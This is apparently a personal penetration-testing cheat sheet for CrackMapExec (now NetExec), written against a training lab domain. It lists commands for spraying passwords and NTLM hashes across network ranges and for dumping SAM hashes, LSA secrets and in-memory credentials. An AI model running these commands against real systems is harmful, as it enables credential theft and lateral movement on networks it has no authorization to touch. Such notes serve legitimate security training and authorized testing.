-- -
This is now called #netexec, you can use these exact same commands, just change `crackmapexec` to `netexec`. 
### Interact w/ db
crackmapexec hosts a database where it keeps all the credentials and what not that you have gathered on an engagement. 
```bash
# open db
cmedb

# show hosts
hosts

# dump all the credentials you have gathered
creds
```
### Using modules
```bash
# List available modules for the service
crackmapexec <service> -L
crackmapexec smb -L

# use a module
crackmapexec smb <ip> -u <username> -p <password> -M <module>
```
### Pass-The-Password
Sweep network with valid set of #userpass credentials to see what kind of access we can get on various machines/services
```bash
# Pass-The-Password against SMB
crackmapexec smb <cidr range> -d <domain> -u <username> -p <password>
crackmapexec smb 192.168.138.0/24 -d MARVEL.local -u fcastle -p Password1
```

^bd85ee

### Pass-The-Hash
Sweep network with valid set of #userhash credentials to see what kind of access we can get on various machines/services. 
```bash
# Note: requires full NTLM hash
# This tests local-authentication versus AD auth

# see where you can log into
crackmapexec smb <cidr range> -u <username> -H <NTLM hash> --local-auth

# see where you can log into and dump the SAM if local admin
crackmapexec smb <cidr range> -u <username> -H <NTLM hash> --local-auth --sam

# Enumerate shares
crackmapexec smb <cidr range> -u <username> -H <NTLM hash> --local-auth --shares

# dump lsa secrets
crackmapexec smb <cidr range> -u <username> -H <NTLM hash> --local-auth --lsa

# Dump secrets in memory, if available
crackmapexec smb <cidr range> -u <username> -H <NTLM hash> --local-auth -M lsassy
```

^116e4a

### Enum usernames on a domain
